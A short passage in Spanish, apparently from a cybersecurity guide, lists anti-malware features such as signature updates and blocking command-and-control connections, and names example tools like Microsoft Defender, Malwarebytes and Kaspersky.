o	Integración con bases de datos de firmas actualizadas para contrarrestar amenazas conocidas.
o	Supervisión del tráfico de red para bloquear conexiones a servidores de comando y control (C2).
Ejemplo de herramientas:
o	Microsoft Defender (integrado en Windows).
o	Malwarebytes (detección avanzada de malware).
o	Kaspersky Anti-Malware (protección en múltiples capas).


